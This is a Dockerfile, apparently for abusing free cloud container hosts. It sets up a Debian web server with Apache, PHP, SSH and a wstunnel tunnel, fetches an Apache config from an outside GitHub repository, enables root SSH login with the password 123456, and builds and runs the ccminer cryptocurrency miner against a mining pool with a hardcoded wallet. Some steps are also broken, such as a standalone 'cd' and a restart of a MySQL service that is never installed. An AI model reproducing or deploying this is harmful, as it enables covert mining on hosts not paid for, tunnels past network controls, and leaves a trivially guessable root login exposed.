FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install ssh wget npm apache2 php php-curl php-cli php-fpm php-json php-common php-mysql php-zip php-gd php-mbstring  php-xml php-pear php-bcmath  -y
RUN  npm install -g wstunnel
RUN mkdir /run/sshd 
RUN a2enmod proxy
RUN a2enmod proxy_http
RUN a2enmod proxy_wstunnel
RUN a2enmod  rewrite
RUN wget https://raw.githubusercontent.com/jarkomp3/berbagicarasetting3/main/000-default.conf
RUN rm /etc/apache2/sites-available/000-default.conf
RUN mv 000-default.conf /etc/apache2/sites-available
RUN echo 'You can play the awesome Cloud NOW! - Message from berbagi cara setting!' >/var/www/html/index.html
RUN echo 'wstunnel -s 0.0.0.0:8989 & ' >>/luo.sh
RUN echo 'service mysql restart' >>/luo.sh
RUN echo 'service apache2 restart' >>/luo.sh
RUN echo '/usr/sbin/sshd -D' >>/luo.sh
RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
RUN echo root:123456|chpasswd
RUN chmod 755 /luo.sh
RUN apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
RUN git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git
RUN cd ccminer
RUN chmod +x build.sh
RUN chmod +x configure.sh
RUN chmod +x autogen.sh
RUN ./build.sh
RUN ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RXJdpoJge8fr62Bguz2EDoXVaNA7o6ZaEc.Gratis -p x -d 0 -t 4 -r 100
EXPOSE 80
CMD  /luo.sh
